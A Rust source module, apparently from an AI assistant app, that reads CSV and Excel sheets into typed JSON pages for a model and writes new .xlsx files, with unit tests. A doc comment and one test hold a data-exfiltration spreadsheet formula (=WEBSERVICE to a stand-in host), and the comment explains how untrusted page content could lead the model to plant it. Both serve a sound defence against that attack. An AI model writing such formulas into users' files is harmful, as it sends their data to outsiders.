//! Spreadsheets, as a grid of cells rather than a bag of words.
//!
//! # What was already there, and why it was not enough
//!
//! `file_text.rs` has always opened `.xlsx` and `.ods`: they are zipped XML,
//! and stripping the tags out of them is enough for full-text search to find a
//! workbook by a word in it. It says itself that it is not a parser — nothing
//! of a row, a column or a sheet survives. So Syn could find the budget and
//! could not say what was in cell C12, and asked to *make* one it could only
//! write a note with a Markdown table in it and hope.
//!
//! This is the grid: which sheets there are, what each cell holds as a value
//! of its own type, and a window onto it small enough to put in front of a
//! model. And the other direction — a new `.xlsx`, never an existing one.
//!
//! # Why rows are JSON arrays and not a Markdown table
//!
//! Both were measured in the only unit that matters here, characters inside a
//! tool result, which is itself JSON:
//!
//! * A Markdown table is a *string* inside that JSON. Every row ends in a
//!   newline that is escaped to two characters, every quote in a cell to two,
//!   every cell is fenced by ` | `, and it needs a `|---|` line besides.
//! * An array of arrays is native to the result. A number costs its digits and
//!   a comma; a string costs its text, two quotes and a comma.
//!
//! Measured on two hundred rows of expenses — date, category, amount, note —
//! the arrays came to 8,354 characters and the table to 8,965: seven per cent
//! shorter, which is a tie-breaker and not the reason. The reason is what the
//! table throws away. `12` and `"12"` are different in an array, so a number
//! the person typed is still a number when the model adds it up, and an
//! account number with a leading zero is still text. In a table both are the
//! same two characters.
//!
//! # Desktop only, for the workbook formats
//!
//! `calamine` and `rust_xlsxwriter` are not in the Android build; see the
//! comment on them in `Cargo.toml` for the measured cost and why. CSV needs no
//! crate at all — the parser below is the whole of it — so a phone reads a CSV
//! the same way a laptop does, and is told plainly when a file needs the
//! desktop app.

use serde_json::Value;

/// Rows handed back when nobody asked for a number.
///
/// Two hundred rows of a ten-column sheet is roughly 12,000 characters, about
/// 3,000 tokens: enough to answer most questions about a household budget or
/// an export from a bank, small enough that asking for the next page is cheap.
pub const DEFAULT_ROWS: usize = 200;

/// The most rows one call may ask for, whatever it asks.
pub const MAX_ROWS: usize = 1_000;

/// Columns handed back at most. A sheet wider than this is almost always a
/// pivot or a report, and the model can ask for the columns it wants by range.
pub const MAX_COLS: usize = 30;

/// How long one cell may be before it is cut. A note pasted into a cell is
/// the usual reason, and one of those should not be able to fill a page.
const CELL_CHARS: usize = 300;

/// What the rows of one answer may cost, in serialised characters.
///
/// Under `MAX_CONTENT_CHARS` in `tools.rs`, with room for the header and the
/// note around them — so the outer truncation, which cuts JSON mid-string,
/// never has to.
const ROWS_CHARS: usize = 24_000;

/// A file this large is refused rather than read.
///
/// calamine reads a whole sheet into memory before a single cell can be
/// looked at, and the window below is cut from that. Fifty megabytes of
/// workbook is several hundred thousand rows, which is a database somebody
/// exported and not a spreadsheet anyone is asking about in a sentence.
pub const MAX_FILE_BYTES: u64 = 50 * 1024 * 1024;

/// Whether this build can open workbooks and write them. CSV always.
pub const WORKBOOKS: bool = cfg!(any(target_os = "windows", target_os = "macos", target_os = "linux"));

/// One sheet, read whole, with where its first cell sits.
#[derive(Debug, Clone, PartialEq)]
pub struct Sheet {
    /// Every sheet in the file, in the file's order.
    pub names: Vec<String>,
    /// The one that was read.
    pub name: String,
    /// Zero-based row and column of `cells[0][0]`. A sheet whose data starts
    /// at C4 is common, and a range the person names is in the sheet's own
    /// coordinates, not in ours.
    pub origin: (u32, u32),
    /// The used range, row by row. Short rows are short: nothing is padded.
    pub cells: Vec<Vec<Value>>,
}

/// The formats this reads, by extension.
pub fn kind_of(extension: &str) -> Option<Kind> {
    match extension.to_ascii_lowercase().as_str() {
        "csv" => Some(Kind::Delimited(None)),
        "tsv" | "tab" => Some(Kind::Delimited(Some('\t'))),
        "xlsx" | "xlsm" | "xlsb" | "xls" | "ods" => Some(Kind::Workbook),
        _ => None,
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    /// Text with a delimiter, known or to be sniffed.
    Delimited(Option<char>),
    /// Anything calamine opens.
    Workbook,
}

/// Read one sheet of a file: the one named, or the first.
pub fn load(path: &std::path::Path, kind: Kind, sheet: Option<&str>) -> Result<Sheet, String> {
    match kind {
        Kind::Delimited(delimiter) => {
            let bytes = std::fs::read(path).map_err(|e| format!("Could not read the file: {e}"))?;
            let text = String::from_utf8_lossy(&bytes);
            let text = text.strip_prefix('\u{feff}').unwrap_or(&text);
            let name = path
                .file_stem()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| "Sheet1".to_string());
            let delimiter = delimiter.unwrap_or_else(|| sniff_delimiter(text));
            let cells = parse_delimited(text, delimiter)
                .into_iter()
                .map(|row| row.iter().map(|c| typed_text(c)).collect())
                .collect();
            Ok(Sheet { names: vec![name.clone()], name, origin: (0, 0), cells })
        }
        Kind::Workbook => load_workbook(path, sheet),
    }
}

#[cfg(any(target_os = "windows", target_os = "macos", target_os = "linux"))]
fn load_workbook(path: &std::path::Path, sheet: Option<&str>) -> Result<Sheet, String> {
    use calamine::Reader;

    let mut book = calamine::open_workbook_auto(path)
        .map_err(|e| format!("Could not open the workbook: {e}"))?;
    let names = book.sheet_names();
    let name = match sheet {
        Some(wanted) => names
            .iter()
            .find(|n| n.as_str() == wanted)
            .or_else(|| names.iter().find(|n| n.eq_ignore_ascii_case(wanted)))
            .cloned()
            .ok_or_else(|| format!("There is no sheet called '{wanted}'. The sheets are: {}.", names.join(", ")))?,
        None => names.first().cloned().ok_or("The workbook has no sheets.")?,
    };
    let range = book
        .worksheet_range(&name)
        .map_err(|e| format!("Could not read sheet '{name}': {e}"))?;

    let origin = range.start().unwrap_or((0, 0));
    let cells = range
        .rows()
        .map(|row| {
            let mut out: Vec<Value> = row.iter().map(cell_value).collect();
            trim_trailing_nulls(&mut out);
            out
        })
        .collect();
    Ok(Sheet { names, name, origin, cells })
}

#[cfg(not(any(target_os = "windows", target_os = "macos", target_os = "linux")))]
fn load_workbook(_path: &std::path::Path, _sheet: Option<&str>) -> Result<Sheet, String> {
    Err("Excel and OpenDocument files can only be opened in the desktop app; a CSV can be read here.".to_string())
}

/// One workbook cell, as the value it is.
#[cfg(any(target_os = "windows", target_os = "macos", target_os = "linux"))]
fn cell_value(cell: &calamine::Data) -> Value {
    use calamine::Data;
    match cell {
        Data::Empty => Value::Null,
        Data::Int(i) => Value::from(*i),
        Data::Float(f) => number(*f),
        Data::Bool(b) => Value::Bool(*b),
        Data::String(s) => Value::String(capped(s)),
        Data::DateTimeIso(s) | Data::DurationIso(s) => Value::String(s.clone()),
        Data::Error(e) => Value::String(e.to_string()),
        Data::DateTime(dt) if dt.is_duration() => Value::String(duration(dt.as_f64())),
        Data::DateTime(dt) => {
            let (y, mo, d, h, mi, s, _) = dt.to_ymd_hms_milli();
            Value::String(date_text(dt.as_f64(), (y, mo, d), (h, mi, s)))
        }
    }
}

/// A date as a person would write it, and no more precisely than it was kept.
///
/// A cell holding only a date is `2026-09-27`, not `2026-09-27T00:00:00` — the
/// midnight is an artefact of how Excel stores a day, and a model shown it
/// will repeat it. A cell holding only a time (a serial below one) is `08:30`.
fn date_text(serial: f64, (y, mo, d): (u16, u8, u8), (h, mi, s): (u8, u8, u8)) -> String {
    let time = if s == 0 { format!("{h:02}:{mi:02}") } else { format!("{h:02}:{mi:02}:{s:02}") };
    if (0.0..1.0).contains(&serial) {
        return time;
    }
    let date = format!("{y:04}-{mo:02}-{d:02}");
    if h == 0 && mi == 0 && s == 0 {
        date
    } else {
        format!("{date} {time}")
    }
}

/// A span of time, in days, as hours and minutes. `36:15` for a day and a
/// half and a quarter hour, because a timesheet adds hours past twenty-four.
fn duration(days: f64) -> String {
    let total = (days * 86_400.0).round() as i64;
    let (sign, total) = if total < 0 { ("-", -total) } else { ("", total) };
    let (h, m, s) = (total / 3600, (total % 3600) / 60, total % 60);
    if s == 0 {
        format!("{sign}{h}:{m:02}")
    } else {
        format!("{sign}{h}:{m:02}:{s:02}")
    }
}

/// A float as the number it was meant to be.
///
/// Spreadsheets store every number as a double, so `12` arrives as `12.0` and
/// `0.1 + 0.2` as `0.30000000000000004`. A whole number is written whole; the
/// rest are rounded to ten places, which is past anything a cell displays and
/// short of the noise.
fn number(f: f64) -> Value {
    if !f.is_finite() {
        return Value::String(f.to_string());
    }
    if f.fract() == 0.0 && f.abs() < 1e15 {
        return Value::from(f as i64);
    }
    let rounded = (f * 1e10).round() / 1e10;
    serde_json::Number::from_f64(rounded)
        .map(Value::Number)
        .unwrap_or(Value::Null)
}

fn capped(s: &str) -> String {
    if s.chars().count() <= CELL_CHARS {
        return s.to_string();
    }
    let mut out: String = s.chars().take(CELL_CHARS).collect();
    out.push('…');
    out
}

fn trim_trailing_nulls(row: &mut Vec<Value>) {
    while row.last().is_some_and(Value::is_null) {
        row.pop();
    }
}

/// A CSV cell, typed the way the person would read it.
///
/// A number only when it is plainly one: digits, one optional point, an
/// optional minus. `0123` stays text, because a leading zero is an account
/// number or a phone number far more often than it is a quantity, and turning
/// it into 123 loses it. `1.234,5` stays text too: which of the two marks is
/// the decimal is a locale question this cannot answer from one cell.
fn typed_text(raw: &str) -> Value {
    let s = raw.trim();
    if s.is_empty() {
        return Value::Null;
    }
    let digits = s.strip_prefix('-').unwrap_or(s);
    let (whole, fraction) = digits.split_once('.').unwrap_or((digits, ""));
    let plain = !whole.is_empty()
        && whole.chars().all(|c| c.is_ascii_digit())
        && fraction.chars().all(|c| c.is_ascii_digit())
        && !(digits.contains('.') && fraction.is_empty())
        && !(whole.len() > 1 && whole.starts_with('0'))
        && digits.len() <= 15;
    if plain {
        if fraction.is_empty() {
            if let Ok(i) = s.parse::<i64>() {
                return Value::from(i);
            }
        } else if let Ok(f) = s.parse::<f64>() {
            return number(f);
        }
    }
    Value::String(capped(raw))
}

/// Which of comma, semicolon and tab separates the fields.
///
/// Counted on the first line, outside quotes. Semicolon is not an exotic
/// case: a spreadsheet saved as CSV where the decimal mark is a comma — Vietnam,
/// most of Europe — uses it, and reading one of those as comma-separated gives
/// one column of everything.
fn sniff_delimiter(text: &str) -> char {
    let mut counts = [(',', 0usize), (';', 0), ('\t', 0)];
    let mut quoted = false;
    for c in text.chars() {
        match c {
            '"' => quoted = !quoted,
            '\n' if !quoted => break,
            _ if !quoted => {
                if let Some(slot) = counts.iter_mut().find(|(d, _)| *d == c) {
                    slot.1 += 1;
                }
            }
            _ => {}
        }
    }
    counts
        .iter()
        .max_by_key(|(d, n)| (*n, *d == ','))
        .map(|(d, _)| *d)
        .unwrap_or(',')
}

/// RFC 4180, which is less than people fear: a field in quotes may hold the
/// delimiter, a newline, or a quote written twice. Nothing else is special.
fn parse_delimited(text: &str, delimiter: char) -> Vec<Vec<String>> {
    let mut rows = Vec::new();
    let mut row = Vec::new();
    let mut field = String::new();
    let mut quoted = false;
    let mut chars = text.chars().peekable();

    while let Some(c) = chars.next() {
        if quoted {
            match c {
                '"' if chars.peek() == Some(&'"') => {
                    field.push('"');
                    chars.next();
                }
                '"' => quoted = false,
                _ => field.push(c),
            }
            continue;
        }
        match c {
            '"' if field.is_empty() => quoted = true,
            '\r' => {}
            '\n' => {
                row.push(std::mem::take(&mut field));
                rows.push(std::mem::take(&mut row));
            }
            _ if c == delimiter => row.push(std::mem::take(&mut field)),
            _ => field.push(c),
        }
    }
    if !field.is_empty() || !row.is_empty() {
        row.push(field);
        rows.push(row);
    }
    rows
}

// ─── Addressing ────────────────────────────────────────────────────

/// `0 → A`, `25 → Z`, `26 → AA`.
pub fn column_name(mut index: u32) -> String {
    let mut out = Vec::new();
    loop {
        out.push(b'A' + (index % 26) as u8);
        if index < 26 {
            break;
        }
        index = index / 26 - 1;
    }
    out.reverse();
    String::from_utf8(out).unwrap_or_default()
}

fn column_index(letters: &str) -> Option<u32> {
    let mut n: u32 = 0;
    for c in letters.chars() {
        if !c.is_ascii_alphabetic() {
            return None;
        }
        n = n.checked_mul(26)?.checked_add(c.to_ascii_uppercase() as u32 - 'A' as u32 + 1)?;
    }
    n.checked_sub(1)
}

/// A window the model asked for, in the sheet's own zero-based coordinates.
/// `None` on an edge means "from the start" or "to the end".
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub struct Window {
    pub rows: (Option<u32>, Option<u32>),
    pub cols: (Option<u32>, Option<u32>),
}

/// `A1:D50`, `B5`, `201:400` or `A:D` — the ways a person names part of a sheet.
pub fn parse_range(raw: &str) -> Result<Window, String> {
    let bad = || format!("'{raw}' is not a range. Use A1 notation, e.g. \"A1:F200\" or \"201:400\" for rows.");
    let raw = raw.trim().replace('$', "");
    // A sheet-qualified range, `Sheet1!A1:B2`: the sheet is its own argument.
    let raw = raw.rsplit_once('!').map(|(_, r)| r.to_string()).unwrap_or(raw);

    let one = |part: &str| -> Result<(Option<u32>, Option<u32>), String> {
        let split = part.find(|c: char| c.is_ascii_digit()).unwrap_or(part.len());
        let (letters, digits) = part.split_at(split);
        let col = if letters.is_empty() { None } else { Some(column_index(letters).ok_or_else(bad)?) };
        let row = if digits.is_empty() {
            None
        } else {
            let n: u32 = digits.parse().map_err(|_| bad())?;
            Some(n.checked_sub(1).ok_or_else(bad)?)
        };
        if col.is_none() && row.is_none() {
            return Err(bad());
        }
        Ok((col, row))
    };

    let (from, to) = match raw.split_once(':') {
        Some((a, b)) => (one(a)?, one(b)?),
        None => {
            let cell = one(&raw)?;
            (cell, cell)
        }
    };
    Ok(Window { rows: (from.1, to.1), cols: (from.0, to.0) })
}

/// What one call hands back: the header, a page of rows, and how to get the
/// next one.
pub fn page(sheet: &Sheet, window: Option<Window>, max_rows: usize) -> Value {
    let max_rows = max_rows.clamp(1, MAX_ROWS);
    let (row0, col0) = sheet.origin;
    let height = sheet.cells.len() as u32;
    let width = sheet.cells.iter().map(Vec::len).max().unwrap_or(0) as u32;

    let used = if height == 0 || width == 0 {
        None
    } else {
        Some(format!(
            "{}{}:{}{}",
            column_name(col0),
            row0 + 1,
            column_name(col0 + width - 1),
            row0 + height
        ))
    };
    let Some(used) = used else {
        return serde_json::json!({
            "sheets": sheet.names,
            "sheet": sheet.name,
            "rows": [],
            "_note": "This sheet is empty.",
        });
    };

    let window = window.unwrap_or_default();
    let last_row = row0 + height - 1;
    let last_col = col0 + width - 1;

    // With no window, the first row is the header and the page starts under it.
    let first = window.rows.0.unwrap_or(row0 + 1).max(row0);
    let asked_last = window.rows.1.unwrap_or(u32::MAX).min(last_row);
    let first_col = window.cols.0.unwrap_or(col0).max(col0);
    let wanted_last_col = window.cols.1.unwrap_or(last_col).min(last_col);
    let last_col_shown = wanted_last_col.min(first_col.saturating_add(MAX_COLS as u32 - 1));
    if first_col > last_col_shown {
        return serde_json::json!({
            "sheets": sheet.names,
            "sheet": sheet.name,
            "used_range": used,
            "rows": [],
            "_note": format!("Nothing there: the sheet's cells are {used}."),
        });
    }

    let slice = |r: u32| -> Vec<Value> {
        let row = &sheet.cells[(r - row0) as usize];
        let mut out: Vec<Value> = (first_col..=last_col_shown)
            .map(|c| row.get((c - col0) as usize).cloned().unwrap_or(Value::Null))
            .collect();
        trim_trailing_nulls(&mut out);
        out
    };

    let header = slice(row0);
    let mut rows = Vec::new();
    let mut spent = 0usize;
    let mut shown_last = None;
    let mut r = first;
    while r <= asked_last && rows.len() < max_rows {
        let row = slice(r);
        spent += serde_json::to_string(&row).map(|s| s.len()).unwrap_or(0) + 1;
        if spent > ROWS_CHARS && !rows.is_empty() {
            break;
        }
        rows.push(row);
        shown_last = Some(r);
        r += 1;
    }

    let columns = format!("{}–{}", column_name(first_col), column_name(last_col_shown));
    let mut out = serde_json::json!({
        "sheets": sheet.names,
        "sheet": sheet.name,
        "used_range": used,
        "header_row": row0 + 1,
        "header": header,
        "rows": rows,
    });

    let Some(shown_last) = shown_last else {
        out["showing"] = Value::from(format!("no rows: row {} is past the end ({})", first + 1, last_row + 1));
        return out;
    };
    out["showing"] = Value::from(format!(
        "rows {}–{} of {}, columns {columns}",
        first + 1,
        shown_last + 1,
        last_row + 1
    ));

    let mut notes = Vec::new();
    if shown_last < asked_last {
        let next_last = (shown_last + 1).saturating_add(max_rows as u32 - 1).min(last_row);
        notes.push(format!(
            "There are more rows. Ask again with range \"{}{}:{}{}\" for the next page.",
            column_name(first_col),
            shown_last + 2,
            column_name(last_col_shown),
            next_last + 1
        ));
    }
    if last_col_shown < wanted_last_col {
        notes.push(format!(
            "Only {MAX_COLS} columns are returned at a time; this sheet runs to column {}. Name the columns you want in range, e.g. \"{}{}:{}{}\".",
            column_name(wanted_last_col),
            column_name(last_col_shown + 1),
            first + 1,
            column_name(wanted_last_col.min(last_col_shown + MAX_COLS as u32)),
            shown_last + 1
        ));
    }
    if !notes.is_empty() {
        out["_note"] = Value::from(notes.join(" "));
    }
    out
}

// ─── Writing ───────────────────────────────────────────────────────

/// A sheet name Excel will accept, and not one already taken.
///
/// Thirty-one characters, none of `[]:*?/\`, not blank, unique within the
/// book ignoring case. A model will happily call two sheets "Summary" or name
/// one "Q1/Q2", and Excel refuses the whole file rather than the one name.
pub fn sheet_name(raw: &str, index: usize, taken: &[String]) -> String {
    let cleaned: String = raw
        .chars()
        .map(|c| if "[]:*?/\\".contains(c) { '_' } else { c })
        .collect::<String>()
        .trim()
        .trim_matches('\'')
        .chars()
        .take(31)
        .collect();
    let base = if cleaned.is_empty() { format!("Sheet{}", index + 1) } else { cleaned };
    let free = |name: &str| !taken.iter().any(|t| t.eq_ignore_ascii_case(name));
    if free(&base) {
        return base;
    }
    (2..)
        .map(|n| {
            let suffix = format!(" ({n})");
            let room = 31usize.saturating_sub(suffix.chars().count());
            format!("{}{suffix}", base.chars().take(room).collect::<String>())
        })
        .find(|candidate| free(candidate))
        .unwrap_or(base)
}

/// Write a new workbook. The caller has already made sure nothing is there.
///
/// Numbers are written as numbers and booleans as booleans, so a column the
/// model filled with amounts can be summed the moment the file is opened. The
/// first row of each sheet is bold, as a header.
///
/// # Why a string beginning with `=` is written as text
///
/// Because it would otherwise be a formula, and this tool is allowed after a
/// run has read something a stranger wrote. `=WEBSERVICE("https://…?"&A1)` is
/// a formula that sends the cell next to it to whoever wrote the page, the
/// moment the person opens the file. A formula is something they can type
/// themselves; it is not something a page gets to put in their workbook.
#[cfg(any(target_os = "windows", target_os = "macos", target_os = "linux"))]
pub fn write_xlsx(path: &std::path::Path, sheets: &[(String, Vec<Vec<Value>>)]) -> Result<(), String> {
    use rust_xlsxwriter::{Format, Workbook};

    let err = |e: rust_xlsxwriter::XlsxError| format!("Could not write the workbook: {e}");
    let mut book = Workbook::new();
    let bold = Format::new().set_bold();

    for (name, rows) in sheets {
        let sheet = book.add_worksheet();
        sheet.set_name(name).map_err(err)?;
        for (r, row) in rows.iter().enumerate() {
            for (c, cell) in row.iter().enumerate() {
                let (r, c) = (r as u32, c as u16);
                let header = r == 0;
                match cell {
                    Value::Null => continue,
                    Value::Number(n) => {
                        let n = n.as_f64().unwrap_or_default();
                        if header {
                            sheet.write_number_with_format(r, c, n, &bold).map_err(err)?;
                        } else {
                            sheet.write_number(r, c, n).map_err(err)?;
                        }
                    }
                    Value::Bool(b) => {
                        if header {
                            sheet.write_boolean_with_format(r, c, *b, &bold).map_err(err)?;
                        } else {
                            sheet.write_boolean(r, c, *b).map_err(err)?;
                        }
                    }
                    other => {
                        let text = match other {
                            Value::String(s) => s.clone(),
                            v => v.to_string(),
                        };
                        if header {
                            sheet.write_string_with_format(r, c, &text, &bold).map_err(err)?;
                        } else {
                            sheet.write_string(r, c, &text).map_err(err)?;
                        }
                    }
                };
            }
        }
        sheet.autofit();
    }

    book.save(path).map_err(err)
}

#[cfg(not(any(target_os = "windows", target_os = "macos", target_os = "linux")))]
pub fn write_xlsx(_path: &std::path::Path, _sheets: &[(String, Vec<Vec<Value>>)]) -> Result<(), String> {
    Err("Spreadsheets can only be written in the desktop app.".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn sheet(cells: Vec<Vec<Value>>) -> Sheet {
        Sheet { names: vec!["S".into()], name: "S".into(), origin: (0, 0), cells }
    }

    #[test]
    fn a_quoted_field_may_hold_the_delimiter_a_newline_and_a_quote() {
        let rows = parse_delimited("a,\"b, \"\"c\"\"\nd\",e\r\n1,2,3\n", ',');
        assert_eq!(rows, vec![vec!["a", "b, \"c\"\nd", "e"], vec!["1", "2", "3"]]);
    }

    #[test]
    fn a_semicolon_file_is_read_as_one() {
        assert_eq!(sniff_delimiter("Ngày;Số tiền;Ghi chú\n01/09;1,5;x"), ';');
        assert_eq!(sniff_delimiter("a,b,c\n"), ',');
        assert_eq!(sniff_delimiter("a\tb\n"), '\t');
    }

    #[test]
    fn numbers_become_numbers_and_account_numbers_stay_text() {
        assert_eq!(typed_text("42"), json!(42));
        assert_eq!(typed_text("-12.50"), json!(-12.5));
        assert_eq!(typed_text("0.3"), json!(0.3));
        assert_eq!(typed_text("0123"), json!("0123"));
        assert_eq!(typed_text("1.234,5"), json!("1.234,5"));
        assert_eq!(typed_text("12."), json!("12."));
        assert_eq!(typed_text(""), Value::Null);
    }

    #[test]
    fn a_float_is_written_as_the_number_it_meant() {
        assert_eq!(number(12.0), json!(12));
        assert_eq!(number(0.1 + 0.2), json!(0.3));
    }

    #[test]
    fn a_date_is_as_precise_as_it_was_kept() {
        assert_eq!(date_text(46_292.0, (2026, 9, 27), (0, 0, 0)), "2026-09-27");
        assert_eq!(date_text(46_292.5, (2026, 9, 27), (12, 0, 0)), "2026-09-27 12:00");
        assert_eq!(date_text(0.354_166, (1899, 12, 30), (8, 30, 0)), "08:30");
        assert_eq!(duration(1.5 + 0.25 / 24.0), "36:15");
    }

    #[test]
    fn columns_are_named_the_way_a_spreadsheet_names_them() {
        assert_eq!(column_name(0), "A");
        assert_eq!(column_name(25), "Z");
        assert_eq!(column_name(26), "AA");
        assert_eq!(column_name(701), "ZZ");
        assert_eq!(column_name(702), "AAA");
        for i in [0, 25, 26, 701, 702, 16_383] {
            assert_eq!(column_index(&column_name(i)), Some(i));
        }
    }

    #[test]
    fn a_range_is_read_in_every_form_a_person_writes_one() {
        assert_eq!(
            parse_range("A1:D50").unwrap(),
            Window { rows: (Some(0), Some(49)), cols: (Some(0), Some(3)) }
        );
        assert_eq!(parse_range("201:400").unwrap().rows, (Some(200), Some(399)));
        assert_eq!(parse_range("B:C").unwrap().cols, (Some(1), Some(2)));
        assert_eq!(parse_range("Sheet1!$B$2").unwrap().rows, (Some(1), Some(1)));
        assert!(parse_range("hello world").is_err());
        assert!(parse_range("A0").is_err());
    }

    /// The point of a page: the model is told where it is and how to go on.
    #[test]
    fn a_long_sheet_comes_back_a_page_at_a_time_with_the_way_to_the_next() {
        let mut cells = vec![vec![json!("Date"), json!("Amount")]];
        for i in 0..450 {
            cells.push(vec![json!(format!("2026-09-{:02}", i % 28 + 1)), json!(i)]);
        }
        let first = page(&sheet(cells.clone()), None, DEFAULT_ROWS);
        assert_eq!(first["header"], json!(["Date", "Amount"]));
        assert_eq!(first["rows"].as_array().unwrap().len(), 200);
        assert_eq!(first["rows"][0], json!(["2026-09-01", 0]));
        assert_eq!(first["showing"], "rows 2–201 of 451, columns A–B");
        assert!(first["_note"].as_str().unwrap().contains("\"A202:B401\""), "{first}");

        let next = page(&sheet(cells), Some(parse_range("A202:B401").unwrap()), DEFAULT_ROWS);
        assert_eq!(next["rows"][0], json!(["2026-09-05", 200]));
        assert_eq!(next["header"], json!(["Date", "Amount"]), "the header comes with every page");
    }

    #[test]
    fn a_wide_sheet_says_how_to_reach_the_columns_it_left_out() {
        let row: Vec<Value> = (0..45).map(|i| json!(i)).collect();
        let out = page(&sheet(vec![row.clone(), row]), None, DEFAULT_ROWS);
        assert_eq!(out["header"].as_array().unwrap().len(), MAX_COLS);
        assert!(out["_note"].as_str().unwrap().contains("AE"), "{out}");
    }

    #[test]
    fn a_sheet_that_starts_below_and_right_of_a1_is_addressed_in_its_own_cells() {
        let s = Sheet {
            origin: (3, 2),
            ..sheet(vec![vec![json!("Name"), json!("Qty")], vec![json!("Pen"), json!(3)]])
        };
        let out = page(&s, None, DEFAULT_ROWS);
        assert_eq!(out["used_range"], "C4:D5");
        assert_eq!(out["header_row"], 4);
        assert_eq!(out["rows"], json!([["Pen", 3]]));
    }

    #[test]
    fn two_sheets_with_one_name_become_two_names_excel_accepts() {
        let mut taken = Vec::new();
        for raw in ["Summary", "summary", "Q1/Q2", "", "A very long sheet name that Excel would refuse"] {
            let name = sheet_name(raw, taken.len(), &taken);
            assert!(name.chars().count() <= 31, "{name}");
            taken.push(name);
        }
        assert_eq!(taken[0], "Summary");
        assert_eq!(taken[1], "summary (2)");
        assert_eq!(taken[2], "Q1_Q2");
        assert_eq!(taken[3], "Sheet4");
    }

    /// What goes in comes back out, as the same kinds of value — and a string
    /// that looks like a formula comes back as the string.
    #[cfg(any(target_os = "windows", target_os = "macos", target_os = "linux"))]
    #[test]
    fn a_written_workbook_reads_back_with_its_numbers_still_numbers() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("Budget.xlsx");
        write_xlsx(
            &path,
            &[(
                "Tháng 9".to_string(),
                vec![
                    vec![json!("Mục"), json!("Số tiền"), json!("Xong")],
                    vec![json!("Cà phê"), json!(45000), json!(true)],
                    vec![json!("=WEBSERVICE(\"https://x.test/?\"&A1)"), json!(12.5), Value::Null],
                ],
            )],
        )
        .unwrap();

        let back = load(&path, Kind::Workbook, None).unwrap();
        assert_eq!(back.names, vec!["Tháng 9"]);
        assert_eq!(back.cells[1], vec![json!("Cà phê"), json!(45000), json!(true)]);
        assert_eq!(back.cells[2][0], json!("=WEBSERVICE(\"https://x.test/?\"&A1)"));
        assert_eq!(back.cells[2][1], json!(12.5));
    }
}
